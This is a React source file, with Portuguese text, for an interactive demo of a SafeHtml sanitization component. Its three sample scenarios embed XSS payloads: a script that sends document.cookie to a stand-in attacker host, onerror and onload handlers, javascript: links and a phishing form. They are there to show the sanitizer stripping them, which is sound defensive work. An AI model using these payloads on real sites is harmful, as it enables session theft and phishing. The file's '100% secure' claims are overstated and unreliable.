/**
 * @file SafeHtmlShowcase.tsx
 * @description Demonstração interativa e arquitetura do componente <SafeHtml>.
 * Exibe cenários do mundo real (comentários de usuários, biografia de perfis,
 * payloads recebidos de APIs externas e feeds de notícias com ataques embutidos).
 */

import React, { useState, useMemo } from 'react';
import { SafeHtml } from './SafeHtml';
import { SanitizationPreset, SanitizeReport, sanitizeClientHtml } from '../security/dompurifyConfig';
import { 
  ShieldCheck, 
  ShieldAlert, 
  Terminal, 
  Code2, 
  MessageSquare, 
  UserCheck, 
  Newspaper, 
  Copy, 
  Check, 
  AlertTriangle,
  Flame,
  ArrowRight
} from 'lucide-react';

interface ShowcaseScenario {
  id: string;
  title: string;
  sourceType: string;
  preset: SanitizationPreset;
  rawPayload: string;
  scenarioDescription: string;
  threatDescription: string;
}

const SHOWCASE_SCENARIOS: ShowcaseScenario[] = [
  {
    id: 'scen-1',
    title: 'Comentário de Usuário com Injeção de Cookie Stealer',
    sourceType: 'Input de Formulário Web',
    preset: 'comment',
    scenarioDescription: 'Um usuário malicioso submete um comentário contendo texto legítimo e um script inline que tenta roubar a sessão via document.cookie.',
    threatDescription: 'Tag <script> maliciosa e tentativa de injeção de manipulador onerror.',
    rawPayload: `<p>Adorei este produto! Recomendo a todos com certeza.</p>
<script>
  // Tentativa de roubo de cookies de autenticação
  fetch('https://evil-attacker.site/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
<p>Entrega super rápida! <img src="x" onerror="alert('XSS executado!')" /></p>`
  },
  {
    id: 'scen-2',
    title: 'Feed de Artigos de Parceiro com Link javascript: e SVG malicioso',
    sourceType: 'API Externa / CMS Headless',
    preset: 'rich',
    scenarioDescription: 'Um feed de notícias importado de uma API externa foi comprometido na origem e traz links maliciosos e vetores SVG.',
    threatDescription: 'Pseudo-protocolo javascript: em link e tag <svg> com evento onload.',
    rawPayload: `<h2>Novo Comunicado Oficial da Empresa</h2>
<p>Confira a matéria completa no link abaixo:</p>
<a href="javascript:alert('Ataque via pseudo-protocolo javascript:!')">Clique aqui para reivindicar bônus exclusivo</a>
<svg onload="document.body.style.background='red'"><circle cx="10" cy="10" r="8" fill="blue"/></svg>
<p>Visite também o nosso site seguro em <a href="https://example.com/noticias">Notícias Oficiais</a>.</p>`
  },
  {
    id: 'scen-3',
    title: 'Biografia de Perfil com Obfuscação CSS e Formaction',
    sourceType: 'Perfil de Usuário (Input Restrito)',
    preset: 'strict',
    scenarioDescription: 'No campo de bio do perfil (preset strict), o invasor tenta criar um formulário para phishing ou injetar CSS expressions.',
    threatDescription: 'Tags de formulário, campos ocultos e estilos arbitrários.',
    rawPayload: `Olá, sou desenvolvedor <strong>React & Node.js</strong> apaixonado por segurança!
<form action="https://phishing.site/login">
  <input type="hidden" name="token" value="session_secret" />
  <button formaction="javascript:alert(1)">Confirmar Redefinição de Senha</button>
</form>
<span style="font-weight: bold; background: url('javascript:alert(1)')">Engenheiro Sênior</span>`
  }
];

export const SafeHtmlShowcase: React.FC = () => {
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>(SHOWCASE_SCENARIOS[0].id);
  const [customPreset, setCustomPreset] = useState<SanitizationPreset>('comment');
  const [editablePayload, setEditablePayload] = useState<string>(SHOWCASE_SCENARIOS[0].rawPayload);
  const [copiedCode, setCopiedCode] = useState(false);

  // Relatório derivado de forma pura e reativa sem side-effects durante render
  const currentSanitizeResult = useMemo(
    () => sanitizeClientHtml(editablePayload, customPreset),
    [editablePayload, customPreset]
  );
  const lastReport = currentSanitizeResult.report;

  const activeScenario = SHOWCASE_SCENARIOS.find((s) => s.id === selectedScenarioId) || SHOWCASE_SCENARIOS[0];

  const handleSelectScenario = (scen: ShowcaseScenario) => {
    setSelectedScenarioId(scen.id);
    setCustomPreset(scen.preset);
    setEditablePayload(scen.rawPayload);
  };

  const copyUsageCode = () => {
    const code = `import { SafeHtml } from '@/components/SafeHtml';

// Renderização 100% segura contra XSS:
<SafeHtml 
  html={userInputOrApiData} 
  preset="${customPreset}"
  showSecurityBadge={true}
/>`;
    navigator.clipboard.writeText(code);
    setCopiedCode(true);
    setTimeout(() => setCopiedCode(false), 2000);
  };

  return (
    <div className="flex flex-col gap-6">
      {/* Overview Banner */}
      <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-lg backdrop-blur">
        <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-1 rounded-md text-xs font-mono font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                CAMADA DE APRESENTAÇÃO BLINDADA
              </span>
              <span className="text-xs text-zinc-400 font-mono">React 19 + DOMPurify</span>
            </div>
            <h2 className="text-xl font-bold text-white mt-1.5 flex items-center gap-2">
              <ShieldCheck className="w-5 h-5 text-emerald-400" />
              Componente &lt;SafeHtml&gt; & Sanitização no Client
            </h2>
            <p className="text-sm text-zinc-400 mt-0.5">
              Substituição imediata e segura para <code className="text-rose-400">dangerouslySetInnerHTML</code> com Allowlist restrita, bloqueio de scripts inline, manipuladores de evento (<code className="text-amber-400">onload</code>, <code className="text-amber-400">onerror</code>) e URIs <code className="text-amber-400">javascript:</code>.
            </p>
          </div>

          <button
            onClick={copyUsageCode}
            className="px-3 py-1.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-200 text-xs font-mono border border-zinc-700 transition-all flex items-center gap-1.5 cursor-pointer"
          >
            {copiedCode ? (
              <>
                <Check className="w-3.5 h-3.5 text-emerald-400" />
                <span className="text-emerald-400">Snippet Copiado!</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span>Copiar Uso do &lt;SafeHtml&gt;</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Scenario Selector Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3.5">
        {SHOWCASE_SCENARIOS.map((scen) => {
          const isSelected = scen.id === selectedScenarioId;
          return (
            <div
              key={scen.id}
              onClick={() => handleSelectScenario(scen)}
              className={`p-4 rounded-xl border cursor-pointer transition-all text-left flex flex-col justify-between ${
                isSelected
                  ? 'bg-zinc-800/90 border-indigo-500 shadow-md ring-1 ring-indigo-500/20'
                  : 'bg-zinc-900/70 border-zinc-800 hover:bg-zinc-800/50 hover:border-zinc-700'
              }`}
            >
              <div>
                <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400 mb-2">
                  <span className="px-2 py-0.5 rounded bg-zinc-950 border border-zinc-800 text-indigo-400 font-semibold">
                    {scen.sourceType}
                  </span>
                  <span className="uppercase text-zinc-500">Preset: {scen.preset}</span>
                </div>
                <h3 className="text-sm font-bold text-white mb-1">{scen.title}</h3>
                <p className="text-xs text-zinc-400 line-clamp-2 leading-relaxed">
                  {scen.scenarioDescription}
                </p>
              </div>

              <div className="mt-3 pt-3 border-t border-zinc-800/60 flex items-center justify-between text-xs font-mono">
                <span className="text-rose-400 text-[11px] flex items-center gap-1">
                  <Flame className="w-3 h-3 text-rose-500" />
                  Vetor Detectado
                </span>
                <span className="text-indigo-400 text-[11px] flex items-center gap-1 font-semibold">
                  Testar Cenário <ArrowRight className="w-3 h-3" />
                </span>
              </div>
            </div>
          );
        })}
      </div>

      {/* Deep Inspection Panel */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Raw Payload Editor */}
        <div className="lg:col-span-6 bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-xl flex flex-col space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Flame className="w-4 h-4 text-rose-500" />
              <h3 className="text-sm font-bold text-white font-mono uppercase">
                1. Entrada Bruta Não Confiável (Raw Payload)
              </h3>
            </div>
            <span className="text-[11px] font-mono text-rose-400 bg-rose-500/10 px-2 py-0.5 rounded border border-rose-500/20">
              Contém Vetores XSS
            </span>
          </div>

          <p className="text-xs text-zinc-400 leading-relaxed">
            {activeScenario.scenarioDescription}
          </p>

          <div className="relative">
            <textarea
              value={editablePayload}
              onChange={(e) => setEditablePayload(e.target.value)}
              rows={9}
              className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-xs font-mono text-rose-300 placeholder-zinc-600 focus:outline-none focus:border-rose-500 focus:ring-1 focus:ring-rose-500 resize-none leading-relaxed"
            />
          </div>

          {/* Preset Selector */}
          <div className="pt-2 flex items-center justify-between border-t border-zinc-800 text-xs font-mono">
            <span className="text-zinc-400">Preset Ativo:</span>
            <div className="flex gap-1.5">
              {(['strict', 'comment', 'rich'] as SanitizationPreset[]).map((p) => (
                <button
                  key={p}
                  onClick={() => setCustomPreset(p)}
                  className={`px-2.5 py-1 rounded text-xs uppercase font-semibold transition-all cursor-pointer ${
                    customPreset === p
                      ? 'bg-indigo-600 text-white shadow-sm'
                      : 'bg-zinc-800 text-zinc-400 hover:text-white'
                  }`}
                >
                  {p}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Right Column: Safe Presentation Output */}
        <div className="lg:col-span-6 bg-zinc-900/90 border border-zinc-800 rounded-xl p-5 shadow-xl flex flex-col space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <h3 className="text-sm font-bold text-white font-mono uppercase">
                2. Renderização Segura via &lt;SafeHtml /&gt;
              </h3>
            </div>
            <span className="text-[11px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20">
              100% Protegido
            </span>
          </div>

          <p className="text-xs text-zinc-400 leading-relaxed">
            O componente removeu tags de script, anulou manipuladores de evento e isolou links externos com <code className="text-indigo-300">rel="noopener noreferrer nofollow"</code>.
          </p>

          {/* Render Area */}
          <div className="flex-1 bg-zinc-950 border border-zinc-800 rounded-xl p-4 min-h-[190px] text-zinc-200 text-sm overflow-y-auto">
            <SafeHtml
              html={editablePayload}
              preset={customPreset}
              showSecurityBadge={true}
              emptyFallback={
                <div className="text-xs text-zinc-500 italic p-4 text-center">
                  O conteúdo continha apenas vetores maliciosos e foi totalmente purgado por segurança.
                </div>
              }
            />
          </div>

          {/* Report Summary */}
          {lastReport && (
            <div className="p-3 rounded-lg bg-zinc-950/70 border border-zinc-800/80 text-[11px] font-mono text-zinc-400 flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <span className="text-emerald-400 font-semibold">Auditoria do Ciclo:</span>
                <span>{lastReport.sanitizedLength} bytes gerados</span>
                <span>• {lastReport.executionTimeMs} ms</span>
              </div>
              {lastReport.hasThreats && (
                <span className="text-rose-400 font-semibold flex items-center gap-1">
                  <ShieldAlert className="w-3.5 h-3.5" />
                  {lastReport.detectedThreats.length} ameaça(s) neutralizada(s)
                </span>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default SafeHtmlShowcase;
